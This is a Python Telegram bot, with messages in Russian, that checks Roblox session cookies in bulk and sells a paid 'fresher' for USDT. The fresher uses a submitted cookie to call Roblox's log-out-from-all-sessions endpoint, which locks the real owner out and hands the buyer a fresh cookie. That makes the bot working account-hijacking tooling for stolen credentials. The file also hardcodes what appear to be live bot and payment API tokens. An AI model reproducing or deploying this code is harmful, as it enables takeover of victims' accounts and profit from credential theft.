import os
import logging
import re
import random
import time
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
import requests
import json
from datetime import datetime, timedelta

# Конфигурация
BOT_TOKEN = "8204086100:AAFmfYGPLqtBpSpJk1FgyCwU87l6K2ZieTo"
CRYPTO_BOT_TOKEN = "470734:AAKKe0DuwX6a5WvXEUnsGGBrRSbyN3YJvxH"
CRYPTO_BOT_API_URL = "https://pay.crypt.bot/api/"
ADMIN_USERNAME = "@pirkw"

logging.basicConfig(level=logging.INFO)

class CryptoPayment:
    def __init__(self):
        self.api_url = CRYPTO_BOT_API_URL
        self.token = CRYPTO_BOT_TOKEN
        self.headers = {
            'Crypto-Pay-API-Token': self.token,
            'Content-Type': 'application/json'
        }
    
    async def create_invoice(self, amount: float, description: str, user_id: int):
        """Создание инвойса для оплаты фрешера"""
        try:
            payload = {
                'asset': 'USDT',
                'amount': str(amount),
                'description': description,
                'hidden_message': f'Оплата фрешера для пользователя {user_id}',
                'paid_btn_name': 'viewItem',
                'paid_btn_url': 'https://t.me/your_bot',
                'payload': str(user_id),
                'allow_comments': False,
                'allow_anonymous': False,
                'expires_in': 86400,
            }
            
            response = requests.post(
                f"{self.api_url}createInvoice",
                headers=self.headers,
                json=payload,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    return True, data['result']
                else:
                    return False, f"Ошибка API: {data.get('error', 'Unknown error')}"
            else:
                return False, f"HTTP ошибка: {response.status_code}"
                
        except Exception as e:
            return False, f"Ошибка создания инвойса: {str(e)}"
    
    async def check_invoice_status(self, invoice_id: int):
        """Проверка статуса инвойса"""
        try:
            response = requests.get(
                f"{self.api_url}getInvoices?invoice_ids={invoice_id}",
                headers=self.headers,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok') and data['result']['items']:
                    invoice = data['result']['items'][0]
                    return True, invoice
                else:
                    return False, "Инвойс не найден"
            else:
                return False, f"HTTP ошибка: {response.status_code}"
                
        except Exception as e:
            return False, f"Ошибка проверки статуса: {str(e)}"

class RobloxCookieChecker:
    def __init__(self):
        self.valid_count = 0
        self.checked_count = 0
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0'
        ]
        self.user_cookies = {}
        self.premium_users = {}
        self.crypto_payment = CryptoPayment()
        self.fresher_price = 1.0
        
    def get_random_user_agent(self):
        return random.choice(self.user_agents)
    
    def make_robust_request(self, url, headers, max_retries=3):
        for attempt in range(max_retries):
            try:
                response = requests.get(url, headers=headers, timeout=15)
                if response.status_code == 429:
                    wait_time = (2 ** attempt) + random.uniform(1, 3)
                    print(f"⚠️ Rate limit hit, waiting {wait_time:.1f}s...")
                    time.sleep(wait_time)
                    continue
                return response
            except requests.exceptions.RequestException as e:
                print(f"⚠️ Request error (attempt {attempt + 1}): {e}")
                if attempt < max_retries - 1:
                    wait_time = (2 ** attempt) + random.uniform(1, 2)
                    time.sleep(wait_time)
        return None

    def activate_premium(self, user_id):
        """Активация доступа к фрешеру"""
        self.premium_users[user_id] = {
            'activated_date': datetime.now(),
            'is_active': True,
            'payment_method': 'cryptobot'
        }

    def check_premium_access(self, user_id):
        """Проверка доступа к фрешеру"""
        return user_id in self.premium_users and self.premium_users[user_id]['is_active']

    def extract_cookies_from_text(self, text):
        """Извлечение куки из текста"""
        cookies = []
        
        # Улучшенный паттерн для поиска куки
        patterns = [
            r'_\|WARNING:-DO-NOT-SHARE-THIS\.--[^\\s]+.*?(?=\\s|$)',
            r'_\|WARNING:-DO-NOT-SHARE-THIS[^\\s]+',
            r'ROBLOSECURITY=[^\\s]+',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                cookie_candidate = match.strip()
                if len(cookie_candidate) > 50 and '_|WARNING:-DO-NOT-SHARE-THIS' in cookie_candidate:
                    cookies.append(cookie_candidate)
                    print(f"🔍 Найдена куки: {cookie_candidate[:80]}...")
        
        # Если не нашли по паттернам, проверяем весь текст как куки
        if not cookies:
            clean_text = text.strip()
            if (len(clean_text) > 300 and 
                '_|WARNING:-DO-NOT-SHARE-THIS' in clean_text):
                cookies.append(clean_text)
                print(f"🔍 Найдена чистая куки: {clean_text[:80]}...")
        
        return cookies

    def clean_cookie_string(self, cookie_data):
        """Очистка куки"""
        # Убираем лишние пробелы и переносы
        cleaned = re.sub(r'\s+', ' ', cookie_data.strip())
        # Убираем возможные префиксы
        cleaned = re.sub(r'^(cookie:|🍪|🔐)\s*', '', cleaned, flags=re.IGNORECASE)
        return cleaned

    def refresh_cookie_properly(self, cookie_data):
        """Правильный фреш куки - выкидывает всех других пользователей"""
        try:
            cookie_clean = self.clean_cookie_string(cookie_data)
            
            # Форматируем куки для заголовка
            if not cookie_clean.startswith('.ROBLOSECURITY='):
                cookie_header = f'.ROBLOSECURITY={cookie_clean}'
            else:
                cookie_header = cookie_clean
            
            headers = {
                'User-Agent': self.get_random_user_agent(),
                'Cookie': cookie_header,
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Referer': 'https://www.roblox.com/',
                'Origin': 'https://www.roblox.com'
            }
            
            # Сначала получаем X-CSRF-TOKEN
            token_url = 'https://auth.roblox.com/v2/login'
            token_response = requests.post(token_url, headers=headers, timeout=10)
            
            csrf_token = None
            if 'x-csrf-token' in token_response.headers:
                csrf_token = token_response.headers['x-csrf-token']
            elif token_response.status_code == 403:
                # Пробуем получить токен другим способом
                csrf_token = self.get_csrf_token(cookie_header)
            
            if not csrf_token:
                return False, cookie_data, "❌ Не удалось получить CSRF token"
            
            # Добавляем токен в заголовки
            headers['X-CSRF-TOKEN'] = csrf_token
            
            # Делаем запрос на выход со всех устройств (это выкинет всех других пользователей)
            logout_all_url = 'https://www.roblox.com/authentication/logoutfromallsessions'
            response = requests.post(logout_all_url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                # Получаем новую куки из заголовков
                if 'set-cookie' in response.headers:
                    new_cookies = response.headers['set-cookie']
                    # Ищем новую куки ROBLOSECURITY
                    roblosecurity_match = re.search(r'\.ROBLOSECURITY=([^;]+)', new_cookies)
                    if roblosecurity_match:
                        new_cookie = roblosecurity_match.group(1)
                        # Проверяем что новая куки валидна
                        is_valid, _, _, username, _ = self.simple_cookie_validation(new_cookie)
                        if is_valid:
                            return True, new_cookie, f"✅ Куки успешно обновлена! Все другие пользователи выкинуты с аккаунта. Доступ только у вас."
                        else:
                            return False, cookie_data, "❌ Новая куки не прошла валидацию"
            
            return False, cookie_data, "❌ Не удалось обновить куки"
            
        except Exception as e:
            print(f"❌ Ошибка обновления куки: {e}")
            return False, cookie_data, f"❌ Ошибка: {str(e)}"

    def get_csrf_token(self, cookie_header):
        """Альтернативный способ получения CSRF token"""
        try:
            headers = {
                'User-Agent': self.get_random_user_agent(),
                'Cookie': cookie_header,
            }
            
            # Пробуем разные эндпоинты для получения токена
            endpoints = [
                'https://www.roblox.com/my/account',
                'https://www.roblox.com/home',
                'https://www.roblox.com/users/profile'
            ]
            
            for endpoint in endpoints:
                response = requests.get(endpoint, headers=headers, timeout=10)
                if 'x-csrf-token' in response.headers:
                    return response.headers['x-csrf-token']
            
            return None
        except:
            return None

    def simple_cookie_validation(self, cookie_data):
        """Проверка валидности куки"""
        self.checked_count += 1
        cookie_clean = self.clean_cookie_string(cookie_data)
        
        if not cookie_clean.startswith('.ROBLOSECURITY='):
            cookie_string = f'.ROBLOSECURITY={cookie_clean}'
        else:
            cookie_string = cookie_clean
        
        user_agent = self.get_random_user_agent()
        headers = {
            'User-Agent': user_agent,
            'Cookie': cookie_string,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.roblox.com/',
            'Origin': 'https://www.roblox.com'
        }
        
        time.sleep(random.uniform(1, 3))
        
        try:
            api_url = 'https://users.roblox.com/v1/users/authenticated'
            response = self.make_robust_request(api_url, headers)
            
            if response and response.status_code == 200:
                user_data = response.json()
                if 'id' in user_data and user_data['id'] > 0:
                    username = user_data.get('name', 'Unknown')
                    user_id = user_data['id']
                    self.valid_count += 1
                    return True, cookie_clean, f"✅ VALID - User: {username} (ID: {user_id})", username, user_id
                
            mobile_headers = headers.copy()
            mobile_headers['User-Agent'] = 'Roblox/iOS'
            mobile_url = 'https://www.roblox.com/mobileapi/userinfo'
            mobile_response = self.make_robust_request(mobile_url, mobile_headers)
            
            if mobile_response and mobile_response.status_code == 200:
                mobile_data = mobile_response.json()
                if 'UserID' in mobile_data and mobile_data['UserID'] > 0:
                    username = mobile_data.get('UserName', 'Unknown')
                    user_id = mobile_data['UserID']
                    self.valid_count += 1
                    return True, cookie_clean, f"✅ VALID - User: {username} (ID: {user_id})", username, user_id
            
            home_response = self.make_robust_request('https://www.roblox.com/home', headers)
            
            if home_response and home_response.status_code == 200:
                current_url = home_response.url.lower()
                if 'login' not in current_url and 'signup' not in current_url:
                    self.valid_count += 1
                    return True, cookie_clean, "✅ VALID - Home page access", "Unknown", "Unknown"
        
        except Exception as e:
            print(f"❌ Ошибка проверки: {e}")
            return False, cookie_clean, f"❌ ERROR - {str(e)}", "Unknown", "Unknown"
        
        return False, cookie_clean, "❌ INVALID - All checks failed", "Unknown", "Unknown"

    def process_multiple_cookies(self, text, user_id):
        """Обработка множественных куки"""
        cookies = self.extract_cookies_from_text(text)
        valid_cookies = []
        invalid_cookies = []
        results = []
        
        print(f"🔍 Найдено куки в тексте: {len(cookies)}")
        
        total = len(cookies)
        if total == 0:
            return [], [], "❌ В тексте не найдено ни одной куки"
        
        self.user_cookies[user_id] = {
            'all_cookies': cookies,
            'valid_cookies': [],
            'invalid_cookies': [],
            'usernames': [],
            'user_ids': []
        }
        
        for i, cookie in enumerate(cookies, 1):
            print(f"🔍 Проверяю куки {i}/{total}")
            is_valid, clean_cookie, status, username, user_id_val = self.simple_cookie_validation(cookie)
            
            if is_valid:
                valid_cookies.append(clean_cookie)
                self.user_cookies[user_id]['valid_cookies'].append(clean_cookie)
                self.user_cookies[user_id]['usernames'].append(username)
                self.user_cookies[user_id]['user_ids'].append(user_id_val)
                results.append(f"✅ {i}/{total}: {status}")
            else:
                invalid_cookies.append(clean_cookie)
                self.user_cookies[user_id]['invalid_cookies'].append(clean_cookie)
                results.append(f"❌ {i}/{total}: {status}")
        
        return valid_cookies, invalid_cookies, "\n".join(results)

    def create_individual_files(self, user_id):
        if user_id not in self.user_cookies:
            return None
        
        user_data = self.user_cookies[user_id]
        valid_cookies = user_data['valid_cookies']
        usernames = user_data['usernames']
        
        if not valid_cookies:
            return None
        
        import zipfile
        timestamp = datetime.now().strftime("%H%M%S")
        zip_filename = f"individual_cookies_{user_id}_{timestamp}.zip"
        
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for i, (cookie, username) in enumerate(zip(valid_cookies, usernames), 1):
                safe_username = re.sub(r'[^\w\-_]', '_', username)
                filename = f"cookie_{i}_{safe_username}.txt"
                
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(cookie)
                
                zipf.write(filename, filename)
                os.remove(filename)
        
        return zip_filename

    def get_command_keyboard(self):
        """Клавиатура с командами"""
        keyboard = [
            [InlineKeyboardButton("🔍 Проверить куки", callback_data="check_cookies"),
             InlineKeyboardButton("📊 Статистика", callback_data="show_stats")],
            [InlineKeyboardButton("🔄 Фрешер куки", callback_data="fresher_info"),
             InlineKeyboardButton("ℹ️ Помощь", callback_data="help_command")]
        ]
        return InlineKeyboardMarkup(keyboard)

checker = RobloxCookieChecker()

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Главное меню бота"""
    menu_text = """
🤖 БОТ ПРОВЕРКИ ROBLOX КУКИ

🎯 Доступные функции:

🔍 ПРОВЕРКА КУКИ - БЕСПЛАТНО
• Проверка валидности куки
• Определение пользователя
• Статистика аккаунта

🔄 ФРЕШЕР КУКИ - 1 USDT
• Обновление куки (выкидывает всех других пользователей)
• Оставляет доступ только у вас
• Возвращает валидную фрешнутую куки

💡 Просто отправьте куки для бесплатной проверки!
    """
    
    if hasattr(update, 'message'):
        await update.message.reply_text(
            menu_text,
            reply_markup=checker.get_command_keyboard()
        )
    else:
        await update.edit_message_text(
            menu_text,
            reply_markup=checker.get_command_keyboard()
        )

async def show_fresher_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Информация о фрешере"""
    user_id = update.effective_user.id
    has_premium = checker.check_premium_access(user_id)
    
    if has_premium:
        fresher_text = """
🔄 ФРЕШЕР КУКИ - АКТИВЕН

✅ У вас есть доступ к фрешеру!

Функции фрешера:
• Обновляет валидные куки
• Выкидывает ВСЕХ других пользователей с аккаунта
• Оставляет доступ только у вас
• Возвращает 100% валидную куки

Как использовать:
1. Отправьте валидную куки для проверки
2. После проверки нажмите "🔄 Обновить куки"
3. Получите фрешнутую куки файлом
        """
        keyboard = [
            [InlineKeyboardButton("🔍 Проверить куки", callback_data="check_cookies")],
            [InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu")]
        ]
    else:
        fresher_text = f"""
🔄 ФРЕШЕР КУКИ - 1 USDT

🔥 МОЩНЫЙ ФРЕШЕР:
• Обновляет ВАЛИДНЫЕ куки
• Выкидывает ВСЕХ других пользователей с аккаунта
• Оставляет доступ ТОЛЬКО у вас
• Возвращает 100% валидную фрешнутую куки

💳 Стоимость: 1 USDT (≈75₽)

Для активации фрешера необходимо произвести оплату.
        """
        keyboard = [
            [InlineKeyboardButton("💎 Купить фрешер за 1 USDT", callback_data="buy_fresher")],
            [InlineKeyboardButton("🔍 Бесплатная проверка", callback_data="check_cookies")],
            [InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu")]
        ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if hasattr(update, 'message'):
        await update.message.reply_text(fresher_text, reply_markup=reply_markup)
    else:
        await update.edit_message_text(fresher_text, reply_markup=reply_markup)

async def create_payment_invoice(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    """Создание инвойса для оплаты фрешера"""
    amount = checker.fresher_price
    
    success, result = await checker.crypto_payment.create_invoice(
        amount=amount,
        description="Доступ к фрешеру куки",
        user_id=user_id
    )
    
    if success:
        invoice_url = result['pay_url']
        invoice_id = result['invoice_id']
        
        payment_text = f"""
💎 ОПЛАТА ФРЕШЕРА

Сумма: {amount} USDT (≈75₽)
Сеть: TRC-20 (Tron)

Для оплаты:
1. Нажмите кнопку "Перейти к оплате"
2. Оплатите {amount} USDT
3. Сделайте скриншот оплаты
4. Отправьте скриншот {ADMIN_USERNAME}

После проверки фрешер будет активирован!
        """
        
        keyboard = [
            [InlineKeyboardButton("🔗 Перейти к оплате", url=invoice_url)],
            [InlineKeyboardButton("📸 Отправить скриншот", url=f"https://t.me/{ADMIN_USERNAME[1:]}")],
            [InlineKeyboardButton("🔄 Проверить оплату", callback_data=f"check_payment_{invoice_id}")],
            [InlineKeyboardButton("🔙 Назад", callback_data="fresher_info")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if hasattr(update, 'message'):
            await update.message.reply_text(payment_text, reply_markup=reply_markup)
        else:
            await update.edit_message_text(payment_text, reply_markup=reply_markup)
    else:
        error_text = f"""
❌ ОШИБКА СОЗДАНИЯ СЧЕТА

Не удалось создать счет для оплаты.
Пожалуйста, попробуйте позже или свяжитесь с {ADMIN_USERNAME}

Ошибка: {result}
        """
        await update.edit_message_text(error_text)

async def send_check_results(update, user_id, valid_cookies, invalid_cookies, process_results):
    """Отправка результатов проверки"""
    has_premium = checker.check_premium_access(user_id)
    
    summary = f"""
📋 РЕЗУЛЬТАТЫ ПРОВЕРКИ:

• Всего обработано: {len(valid_cookies) + len(invalid_cookies)}
• ✅ Валидных: {len(valid_cookies)}
• ❌ Невалидных: {len(invalid_cookies)}
• 📊 Успех: {len(valid_cookies)/(len(valid_cookies) + len(invalid_cookies))*100:.1f}%

{'💎 Статус: Фрешер доступен' if has_premium else '💡 Фрешер: 1 USDT'}
    """
    
    keyboard = [
        [InlineKeyboardButton("📁 Распределить по файлам", callback_data="distribute_files")],
        [InlineKeyboardButton("📦 Скачать общий файл", callback_data="download_combined")]
    ]
    
    if has_premium and valid_cookies:
        keyboard.append([InlineKeyboardButton("🔄 Обновить куки", callback_data="refresh_cookies")])
    elif valid_cookies:
        keyboard.append([InlineKeyboardButton("💎 Купить фрешер за 1 USDT", callback_data="buy_fresher")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(summary, reply_markup=reply_markup)
    
    # Отправляем детальные результаты если есть
    if process_results and len(process_results) > 0:
        results_lines = process_results.split('\n')
        chunk_size = 10
        for i in range(0, len(results_lines), chunk_size):
            chunk = '\n'.join(results_lines[i:i + chunk_size])
            if chunk.strip():
                await update.message.reply_text(f"```\n{chunk}\n```", parse_mode='MarkdownV2')

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_main_menu(update, context)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Обрабатываем проверку куки (бесплатно)
    await process_cookie_check(update, user_id)

async def process_cookie_check(update: Update, user_id: int):
    """Обработка проверки куки"""
    if update.message.text:
        text_content = update.message.text
        await update.message.reply_text("🔍 Ищу куки в тексте...")
        
        valid_cookies, invalid_cookies, process_results = checker.process_multiple_cookies(text_content, user_id)
        
        if not valid_cookies and not invalid_cookies:
            await update.message.reply_text("❌ Не удалось найти куки в тексте.")
            return
        
        # Показываем результаты
        await send_check_results(update, user_id, valid_cookies, invalid_cookies, process_results)

    elif update.message.document:
        file = await update.message.document.get_file()
        file_path = f"temp_{user_id}.txt"
        await file.download_to_drive(file_path)
        
        with open(file_path, 'r', encoding='utf-8') as f:
            file_content = f.read()
        
        await update.message.reply_text("🔍 Обрабатываю файл...")
        
        valid_cookies, invalid_cookies, process_results = checker.process_multiple_cookies(file_content, user_id)
        
        if not valid_cookies and not invalid_cookies:
            await update.message.reply_text("❌ В файле не найдено куки")
            os.remove(file_path)
            return
        
        # Отправляем результаты проверки для файла
        await send_check_results(update, user_id, valid_cookies, invalid_cookies, process_results)
        os.remove(file_path)

async def send_results_files(update, user_id, valid_cookies, invalid_cookies):
    """Отправка файлов с результатами"""
    timestamp = datetime.now().strftime("%H%M%S")
    
    if valid_cookies:
        valid_filename = f"valid_{user_id}_{timestamp}.txt"
        with open(valid_filename, 'w', encoding='utf-8') as f:
            for cookie in valid_cookies:
                f.write(cookie + '\n\n')
        
        caption = f"✅ ВАЛИДНЫЕ КУКИ: {len(valid_cookies)} шт."
        await update.message.reply_document(
            document=open(valid_filename, 'rb'),
            caption=caption
        )
        os.remove(valid_filename)
    
    if invalid_cookies:
        invalid_filename = f"invalid_{user_id}_{timestamp}.txt"
        with open(invalid_filename, 'w', encoding='utf-8') as f:
            for cookie in invalid_cookies:
                f.write(cookie + '\n\n')
        
        await update.message.reply_document(
            document=open(invalid_filename, 'rb'),
            caption=f"❌ НЕВАЛИДНЫЕ КУКИ: {len(invalid_cookies)} шт."
        )
        os.remove(invalid_filename)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик нажатий кнопок"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if query.data == "main_menu":
        await show_main_menu(query, context)
    
    elif query.data == "check_cookies":
        await query.edit_message_text(
            "🔍 Отправьте куки для проверки:\n\n"
            "Вы можете отправить:\n"
            "• Текст с куки\n"
            "• Файл .txt с куки\n"
            "• Несколько куки в одном сообщении\n\n"
            "✅ Проверка куки - БЕСПЛАТНО",
            reply_markup=checker.get_command_keyboard()
        )
    
    elif query.data == "fresher_info":
        await show_fresher_info(query, context)
    
    elif query.data == "buy_fresher":
        await create_payment_invoice(query, context, user_id)
    
    elif query.data.startswith("check_payment_"):
        invoice_id = int(query.data.split("_")[2])
        await query.edit_message_text("🔍 Проверяю статус оплаты...")
        
        success, result = await checker.crypto_payment.check_invoice_status(invoice_id)
        
        if success and result.get('status') == 'paid':
            # Активируем фрешер
            checker.activate_premium(user_id)
            await query.edit_message_text(
                "✅ ОПЛАТА ПОДТВЕРЖДЕНА!\n\n"
                "🎉 Доступ к фрешеру активирован!\n\n"
                "Теперь вы можете обновлять куки и выкидывать всех других пользователей с аккаунтов."
            )
        else:
            await query.edit_message_text(
                "❌ ОПЛАТА НЕ НАЙДЕНА\n\n"
                "Если вы произвели оплату:\n"
                "1. Убедитесь, что транзакция завершена\n"
                "2. Отправьте скриншот оплаты " + ADMIN_USERNAME + "\n"
                "3. Подождите несколько минут\n\n"
                "Или попробуйте проверить снова через 5 минут"
            )
    
    elif query.data == "refresh_cookies":
        if not checker.check_premium_access(user_id):
            await query.edit_message_text("❌ У вас нет доступа к фрешеру. Приобретите доступ за 1 USDT.")
            return
        
        if user_id not in checker.user_cookies or not checker.user_cookies[user_id]['valid_cookies']:
            await query.edit_message_text("❌ Нет валидных куки для обновления.")
            return
        
        await query.edit_message_text("🔄 Начинаю процесс обновления куки...")
        
        # Берем первую валидную куки для обновления
        cookie_to_refresh = checker.user_cookies[user_id]['valid_cookies'][0]
        username = checker.user_cookies[user_id]['usernames'][0]
        
        success, new_cookie, message = checker.refresh_cookie_properly(cookie_to_refresh)
        
        if success:
            # Сохраняем фрешнутую куки в файл
            timestamp = datetime.now().strftime("%H%M%S")
            filename = f"refreshed_{user_id}_{timestamp}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(new_cookie)
            
            result_text = f"""
✅ КУКИ УСПЕШНО ОБНОВЛЕНА!

👤 Пользователь: {username}
🔄 Результат: {message}

📁 Файл с фрешнутой куки прикреплен ниже.
Куки 100% валидна и готова к использованию.
            """
            
            await query.message.reply_text(result_text)
            await query.message.reply_document(
                document=open(filename, 'rb'),
                caption=f"🔄 Фрешнутая куки для {username}"
            )
            os.remove(filename)
        else:
            await query.edit_message_text(f"❌ {message}")
    
    elif query.data == "show_stats":
        stats_text = f"""
📊 СТАТИСТИКА ПРОВЕРОК:

• Всего проверено: {checker.checked_count}
• Валидных куки: {checker.valid_count}
• Невалидных: {checker.checked_count - checker.valid_count}
• Процент валидных: {checker.valid_count/max(1, checker.checked_count)*100:.1f}%
• Пользователей с фрешером: {len(checker.premium_users)}
        """
        await query.edit_message_text(
            stats_text,
            reply_markup=checker.get_command_keyboard()
        )
    
    elif query.data == "distribute_files":
        await query.edit_message_text("📁 Создаю отдельные файлы для каждой куки...")
        zip_filename = checker.create_individual_files(user_id)
        if zip_filename and os.path.exists(zip_filename):
            with open(zip_filename, 'rb') as zip_file:
                await query.message.reply_document(
                    document=open(zip_filename, 'rb'),
                    caption=f"📁 Архив с {len(checker.user_cookies[user_id]['valid_cookies'])} отдельными файлами куки"
                )
            os.remove(zip_filename)
        else:
            await query.message.reply_text("❌ Не удалось создать файлы распределения")
    
    elif query.data == "download_combined":
        if user_id in checker.user_cookies:
            valid_cookies = checker.user_cookies[user_id]['valid_cookies']
            invalid_cookies = checker.user_cookies[user_id]['invalid_cookies']
            await send_results_files(query, user_id, valid_cookies, invalid_cookies)
        else:
            await query.message.reply_text("❌ Нет данных для скачивания")
    
    elif query.data == "help_command":
        help_text = f"""
ℹ️ ПОМОЩЬ ПО БОТУ

Бесплатные функции:
• Проверка валидности куки
• Определение пользователя
• Статистика аккаунта
• Скачивание результатов

Платные функции (1 USDT):
• ФРЕШЕР КУКИ - обновляет валидные куки
• Выкидывает ВСЕХ других пользователей с аккаунта
• Оставляет доступ ТОЛЬКО у вас
• Возвращает 100% валидную фрешнутую куки

Как использовать:
1. Отправьте куки текстом или файлом
2. Получите результаты проверки
3. При необходимости обновите куки через фрешер

Поддержка: {ADMIN_USERNAME}
        """
        await query.edit_message_text(
            help_text,
            reply_markup=checker.get_command_keyboard()
        )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, handle_message))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("🤖 Бот проверки Roblox куки запущен...")
    print("✅ Чекер - бесплатно")
    print("✅ Фрешер - 1 USDT (выкидывает всех других пользователей)")
    print("✅ Бот готов к работе!")
    app.run_polling()

if __name__ == "__main__":
    main()
